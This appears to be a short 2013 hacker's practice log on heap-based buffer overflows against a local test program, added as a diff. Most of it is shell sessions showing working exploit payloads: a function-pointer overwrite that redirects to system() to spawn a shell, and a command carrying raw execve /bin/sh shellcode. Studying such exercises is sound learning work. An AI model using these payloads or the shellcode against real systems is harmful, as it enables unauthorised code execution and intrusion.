@@ -1,0 +1,38 @@
+Shawn the R0ck - May 24 2013
+
+I've been playing with stack-based stuff for a while. As we know the
+heap is one of important part in memory sections just like stack. I
+decided spend some time hack on heap-based buffer overflow. Then I got
+a really great paper which was written by By: Matt Conover
+(a.k.a. Shok) & w00w00 Security Team. I'm very sad to say that w00w00
+didn't update the website for a long time. That old phrase came out of
+my mind again: I missed the golden age of Phrack.....
+
+TESTING Platform: Slackware 13.37 32-bit
+
+shawn@sl13:~$ gcc victim.c 
+shawn@sl13:~$ ./a.out 
+Usage: ./a.out <buf> <goodfunc arg>
+shawn@sl13:~$ ./a.out a b 
+(for 1st exploit) system() = 0x80483a4
+(for 2nd exploit, stack method) argv[2] = 0xbffff4a8
+(for 2nd exploit, heap offset method) buf = 0x8049960
+
+before overflow: funcptr points to 0x804860e
+after overflow: funcptr points to 0x804860e
+
+Hi, I'm a good function.  I was passed: b
+shawn@sl13:~$ ./a.out `python -c 'print "A" * 64 + "\xa4\x83\x04\x08"'` "/bin/sh"
+(for 1st exploit) system() = 0x80483a4
+(for 2nd exploit, stack method) argv[2] = 0xbffff4a2
+(for 2nd exploit, heap offset method) buf = 0x8049960
+
+before overflow: funcptr points to 0x804860e
+after overflow: funcptr points to 0x80483a4
+sh-4.1$
+
+
+./exp2 646 stack
+
+usage heap:
+./vulprog `python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "A" * 19 + "\x60\x99\x04\x08\x00"'` 0
